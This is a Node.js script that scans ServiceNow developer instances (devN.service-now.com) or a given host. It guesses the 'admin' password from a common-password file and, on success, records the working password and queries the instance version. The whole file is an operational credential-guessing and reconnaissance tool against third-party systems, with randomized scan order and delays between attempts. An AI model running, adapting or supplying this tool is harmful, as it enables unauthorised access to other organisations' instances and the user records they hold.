const maxRangeSize = 5;
let operations = ["dev", "host"];
let argv = require('yargs') // eslint-disable-line
  .usage('Usage: $0 -o [{dev|host}] options')
  .demandOption(['o'])
  .option('operation', {
    alias: 'o',
    describe: operations.toString()
  })
  .option('target', {
    alias: 't',
    describe: 'if o=host, target should be the fqdn'
  })
  .option('numStart', {
    alias: 's',
    describe: 'if o=dev, lower limit of the dev scan range'
  })
  .option('numEnd', {
    alias: 'e',
    describe: 'if o=dev, higher limit of the dev scan range'
  })
  .option('testAuth', {
    alias: 'a',
    describe: 'try to authenticate using common passwords'
  })
  .option('getVersion', {
    alias: 'v',
    describe: 'if authenticated, get version'
  })
  .argv


let operation = argv["operation"];
let instances = {};
let passwordsArray = [];
if (operations.indexOf(operation) == -1) {
    console.log("error: operation must be one of " + operations.toString());
    return false;
}

const dns = require("dns"),
    https = require("https"),
    btoa = require("btoa"),
    fs = require('fs'),
    ProgressBar = require('progress');
const SERVERDIR = "";
const pwdFile = SERVERDIR + 'pwd.json';
const testPath = "/api/now/table/sys_user/6816f79cc0a8016401c5a33be04be441";



/**
 * @name initProcess
 * @description Reads the passwords file (if auth test requested) and starts the scan process
 * @fires startProcess
 */
const initProcess = () => {
    // load passwords file
    if (argv["testAuth"]) {
        fs.readFile(pwdFile, (err, data) => {
            if(err) {
                console.log("Unable to load password file: " + err);
                return false;
            } else {
                try { 
                    passwordsArray = JSON.parse(data); 
                    startProcess();
                }
                catch(err) {
                    console.log("Unable to parse password file: " + err);
                    return false;
                }
            }
        });
    } else {
        startProcess();
    }
}

/**
 * @name startProcess
 * @description 
 * @fires scanHost
 * @fires scanDevInstances
 */
const startProcess = () => {
    if (operation == "dev") {
        scanDevInstances(parseInt(argv["numStart"]), (argv["numEnd"] !== undefined ? parseInt(argv["numEnd"]) : parseInt(argv["numStart"])));
    }
    if (operation == "host") {
        scanHost(argv["target"]);
    }
}

/**
 * @name scanHost
 * @description Initializes a single hostname scan
 * @param {string} host
 * @fires _scanInstance
 */
const scanHost = (host) => {
    if (host === undefined) { 
        console.log("error: target is required in host mode");
        return false;
    }
    console.log("Scanning target instance " + host + ", " + (argv["testAuth"] ? "WITH" : "WITHOUT") + " authentication");
    instances[host] = {
        "name": host,
        "address": "",
        "active": false,
        "found": false,
        "connected": false,
        "password": "",
        "version": ""
    };
    _scanInstance(host);
}

/**
 * @name scanDevInstances
 * @description Initializes a dev instance range scan
 * @param {number} numStart
 * @param {number} numEnd
 * @fires _scanInstance
 */
const scanDevInstances = (numStart, numEnd) => {
    if (!(numStart > 0) || !(numEnd > 0) || Math.abs(numStart - numEnd) > maxRangeSize) {
        console.log("error: numStart or numEnd are not positive integers or the range is too large (>" + maxRangeSize + ")");
        return false;
    }
    if (!(numStart > 0) || !(numEnd > 0) || Math.abs(numStart - numEnd) > maxRangeSize) {
        console.log("error: numStart or numEnd are not positive integers or the range is too large (>" + maxRangeSize + ")");
        return false;
    }

    if (numStart > numEnd) {
        let tmp = numStart;
        numStart = numEnd;
        numEnd = tmp;
    }
    console.log("Scanning dev instances from " + numStart + " to " + numEnd + ", " + (argv["testAuth"] ? "WITH" : "WITHOUT") + " authentication");
 
    let instance = "";
    let numArray = [];
    for (let i=numStart; i<= numEnd; i++) {
        numArray.push(i);
    }
    shuffle(numArray);  // put a bit of randomness
    numArray.forEach((i) => {
        instance = 'dev' + i + '.service-now.com';
        instances[instance] = {
            "name": instance,
            "address": "",
            "active": false,
            "found": false,
            "connected": false,
            "password": "",
            "version": ""
        };
        _scanInstance(instance);
    });
}

/**
 * @name _scanInstance
 * @description Scans the specified instance
 * @param {String} hostname
 */
const _scanInstance = (hostname) => {
    dns.resolve(hostname, (err, address) => {
        if (!err) {
            instances[hostname]["address"] = address;
            instances[hostname]["found"] = true;
            if (argv["testAuth"]) {
                let hostbar = new ProgressBar(hostname + ' :bar :percent', { total: passwordsArray.length });
                _testAuth(hostname, hostbar)
            } else {
                let headersObj = {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json'
                };
                https.get({
                    hostname: hostname,
                    path: testPath,
                    headers: headersObj
                    }, (resp) => {
                    let data = '';
                    // A chunk of data has been recieved.
                    resp.on('data', (chunk) => {
                        data += chunk;
                    });
                    // The whole response has been received. Print out the result.
                    resp.on('end', () => {
                        if (resp.statusCode == 200 || resp.statusCode == 401 || resp.statusCode == 404) {
                            instances[hostname]["active"] = true;
                        }
                    });
                }).on("error", (err) => {
                    console.log("error: " + err.message);
                });
            }
        }
    });
}

/**
 * @name _testAuth
 * @description Tries to authenticate using the (pwdIndex)th password of the passwordsArray
 * @param {string} hostname
 * @param {object} hostbar
 * @param {number} pwdIndex
 */
const _testAuth = (hostname, hostbar, pwdIndex) => {
    hostbar.tick();
    if (hostname === undefined) { return false; }
    if (pwdIndex === undefined) { pwdIndex = 0; }
    let pwd = passwordsArray[pwdIndex];
    if (pwd === undefined) { return false; }
    let headersObj = {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': 'Basic '+btoa('admin'+':'+pwd)
    };
    https.get({
        hostname: hostname,
        path: testPath,
        headers: headersObj
        }, (resp) => {
        let data = '';
        // A chunk of data has been recieved.
        resp.on('data', (chunk) => {
            data += chunk;
        });
        // The whole response has been received. Print out the result.
        resp.on('end', () => {
            if (resp.statusCode == 200 || resp.statusCode == 401 || resp.statusCode == 404) {
                try {
                    JSON.parse(data);
                    instances[hostname]["active"] = true;
                    if (resp.statusCode != 401) {
                        instances[hostname]["connected"] = true;
                        instances[hostname]["password"] = pwd;
                        if (argv["getVersion"]) {
                            getVersion(hostname);
                        }
                    } else {
                        setTimeout(_testAuth, 1500, hostname, hostbar, pwdIndex + 1);
                    }
                } catch (e) {
                    console.log(e);
                }
            }
        });
    }).on("error", (err) => {
        console.log("Error: " + err.message);
    });    
};

/**
 * @name getVersion
 * @description fetches the xmlstats.do page from hostname to get the current version
 * @param {String} hostname 
 */
const getVersion = (hostname) => {
    let headersObj = {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': 'Basic '+btoa('admin'+':'+instances[hostname]["password"])
    };
    https.get({
        hostname: hostname,
        path: "/api/now/table/sys_properties?sysparm_query=name%3Dglide.war&sysparm_fields=value",
        headers: headersObj
        }, (resp) => {
        let data = '';
        // A chunk of data has been recieved.
        resp.on('data', (chunk) => {
            data += chunk;
        });
        // The whole response has been received. Print out the result.
        resp.on('end', () => {
            try {
                let result = JSON.parse(data).result[0].value;
                instances[hostname]["version"] = result;
            } catch(e) {
                console.log("error: " + e);
            }
        });
    }).on("error", (err) => {
        console.log("error: " + err.message);
    });
}


/**
 * @name shuffle
 * @description shuffles an array to add some randomness to a range scan
 * @param {array} array
 */
const shuffle = (array) => {
    for (let i = array.length - 1; i > 0; i--) {
        let j = Math.floor(Math.random() * (i + 1)); // random index from 0 to i
        [array[i], array[j]] = [array[j], array[i]]; // swap elements
    }
}

process.on('exit', () => {
    console.log(instances);
});
initProcess();
